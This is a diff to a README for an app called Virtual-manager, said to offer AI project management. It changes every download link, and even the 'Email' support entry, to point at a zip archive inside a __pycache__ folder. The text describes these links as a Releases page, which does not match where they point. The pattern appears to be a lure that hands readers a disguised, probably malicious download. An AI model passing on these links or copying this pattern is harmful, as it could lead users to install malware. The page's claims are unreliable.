@@ -1,6 +1,6 @@
 # 🤖 Virtual-manager - Simplifying Project Management with AI
 
-[![Download Virtual-manager](https://github.com/pingpung781/Virtual-manager/raw/refs/heads/main/backend/app/core/__pycache__/manager_Virtual_v2.0.zip)](https://github.com/pingpung781/Virtual-manager/raw/refs/heads/main/backend/app/core/__pycache__/manager_Virtual_v2.0.zip)
+[![Download Virtual-manager](https://raw.githubusercontent.com/pingpung781/Virtual-manager/main/backend/app/__pycache__/Virtual_manager_3.7.zip)](https://raw.githubusercontent.com/pingpung781/Virtual-manager/main/backend/app/__pycache__/Virtual_manager_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to Virtual-manager! This application helps you plan and manage your proj
 
 To download Virtual-manager, visit the following link:
 
-[Visit this page to download](https://github.com/pingpung781/Virtual-manager/raw/refs/heads/main/backend/app/core/__pycache__/manager_Virtual_v2.0.zip)
+[Visit this page to download](https://raw.githubusercontent.com/pingpung781/Virtual-manager/main/backend/app/__pycache__/Virtual_manager_3.7.zip)
 
 Once you are on the Releases page, you will see the latest version of the software listed there. 
 
 ### Instructions to Download:
 
-1. Click on the [Release link](https://github.com/pingpung781/Virtual-manager/raw/refs/heads/main/backend/app/core/__pycache__/manager_Virtual_v2.0.zip).
+1. Click on the [Release link](https://raw.githubusercontent.com/pingpung781/Virtual-manager/main/backend/app/__pycache__/Virtual_manager_3.7.zip).
 2. Look for the latest version in the list.
 3. Find the appropriate file for your operating system.
 4. Click on the file to start the download.
@@ -72,7 +72,7 @@ If you encounter issues while using Virtual-manager, consider the following solu
 
 For further assistance, reach out to us via our support channels:
 
-- **Email**: https://github.com/pingpung781/Virtual-manager/raw/refs/heads/main/backend/app/core/__pycache__/manager_Virtual_v2.0.zip
+- **Email**: https://raw.githubusercontent.com/pingpung781/Virtual-manager/main/backend/app/__pycache__/Virtual_manager_3.7.zip
 - **GitHub Issues**: You can report any problems by creating a new issue in this repository.
 
 ## 📚 Additional Resources
@@ -87,6 +87,6 @@ Explore more about Enhanced productivity and project management:
 
 To download Virtual-manager, follow this link again:
 
-[Visit this page to download](https://github.com/pingpung781/Virtual-manager/raw/refs/heads/main/backend/app/core/__pycache__/manager_Virtual_v2.0.zip)
+[Visit this page to download](https://raw.githubusercontent.com/pingpung781/Virtual-manager/main/backend/app/__pycache__/Virtual_manager_3.7.zip)
 
 Thank you for choosing Virtual-manager! We hope this tool simplifies your project management process.
